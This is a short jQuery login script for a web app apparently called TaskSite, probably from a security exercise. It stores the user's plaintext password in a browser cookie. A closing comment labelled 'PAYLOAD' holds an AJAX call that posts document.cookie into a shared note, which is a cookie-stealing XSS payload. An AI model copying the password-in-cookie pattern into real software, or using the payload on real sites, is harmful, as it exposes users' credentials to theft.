$(document).ready(function(){

    $("#login").on('click', function () {
        $.ajax({
            url: "/TaskSite/login",
            type: 'POST',
            data: 'username=' + $('#username').val() + '&password=' + $('#password').val()})
            .done(function(data) {
                window.location = "index";

                var today = new Date(), expires = new Date();

                expires.setTime(today.getTime() + (60*60*1000));

                document.cookie = "username" + "=" + $('#username').val() + ";expires=" + expires.toGMTString();
                document.cookie = "password" + "=" + $('#password').val() + ";expires=" + expires.toGMTString();
            }).fail(function(jqXHR, textStatus, errorThrown) {
                alert('Wrong username or password.');
            });
    }) ;
}) ;

// PAYLOAD !!!!
// $.ajax({url:'http://localhost:8080/TaskSite/commentary/share?id_Note=4',type: 'GET',data:'content='+document.cookie})